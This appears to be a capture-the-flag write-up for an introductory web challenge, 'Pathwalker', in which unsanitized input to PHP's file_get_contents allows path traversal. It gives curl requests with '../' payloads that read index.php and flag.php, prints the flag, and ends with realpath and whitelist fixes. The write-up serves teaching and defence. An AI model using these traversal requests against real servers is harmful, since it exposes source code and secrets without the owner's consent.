---
title: "Pathwalker"
date: 2026-04-26
categories:
  - Web
tags:
  - Path Traversal
  - Information Disclosure
  - file_get_contents
collections:
  - NCKUCTF
---



> **A file reader allowing users to load pages from the file system. Can you escape the intended directory and uncover hidden server secrets?**

{{< admonition tldr "TL;DR" >}}

**Pathwalker** is an introductory web challenge illustrating a **Path Traversal (Directory Traversal)** vulnerability. The application passes an unsanitized `page` parameter to `file_get_contents()` . By supplying dot-dot-slash ( `../` ) directory traversal sequences, an attacker can traverse up out of the restricted `./page/` directory and read arbitrary files across the server, including `flag.php` .

{{< /admonition >}}

## Source Code Analysis

The target application features simple dynamic content retrieval:

```php
if (isset($_GET['page'])) {
    echo file_get_contents("./page/" . $_GET['page'] . ".php");
}
```

### Operational Behavior

1. The script reads input from `$_GET['page']` .
2. It concatenates the input into a target path string: `./page/{input}.php` .
3. It loads and prints the file contents using `file_get_contents()` .

---

## Vulnerability Identification

The script is vulnerable to **Path Traversal**:

- The application performs **no input sanitization** or boundary enforcement on `$_GET['page']` .
- Directory navigation sequences ( `../` ) are not filtered or resolved against an approved base path.
- `file_get_contents()` reads raw file bytes without executing PHP code. This means that even if a `.php` file contains code like `<?php die(); ?>` , the script will still display the uninterpreted PHP source code.

---

## Exploitation

### 1. Verifying Path Traversal

We test whether directory traversal sequences are processed by requesting the application's own `index.php` :

```bash
curl "https://chall.nckuctf.org:28109/?page=../index"
```

The response renders the complete `index.php` source code, confirming that directory traversal sequences successfully navigate out of `./page/` .

### 2. Accessing the Flag File

Knowing that the flag is stored in `flag.php` at the application root:

```bash
curl -s "https://chall.nckuctf.org:28109/?page=../flag"
```

Output:

```php
<?php
  // NCKUCTF{p47h_724v32541_15_0u2_f213nd}
  die();
?>
```

The server returns the raw source code of `flag.php` , revealing the flag in the code comment before the `die()` call.

We can isolate the flag with `grep` :

```bash
curl -s "https://chall.nckuctf.org:28109/?page=../flag" | grep -oP "NCKUCTF\{.*?\}"
```

```text
NCKUCTF{p47h_724v32541_15_0u2_f213nd}
```

---

##Flags

```text
NCKUCTF{p47h_724v32541_15_0u2_f213nd}
```

---

## Mitigation & Prevention

1. **Path Normalization and Boundary Checks:** Use `realpath()` to resolve canonical paths and ensure the resulting path starts with the authorized directory prefix:

```php
   $baseDir = realpath('/var/www/html/page/');
   $targetPath = realpath($baseDir . '/' . $_GET['page'] . '.php');

   if ($targetPath === false || strpos($targetPath, $baseDir) !== 0) {
       http_response_code(403);
       die('Access denied.');
   }
   ```

2. **Strict Whitelisting:** Define an explicit array of allowable views rather than relying on dynamic filesystem paths:

```php
   $allowed = ['apple', 'banana', 'cappo'];
   if (!in_array($_GET['page'], $allowed, true)) {
       die('Invalid page requested.');
   }
   ```
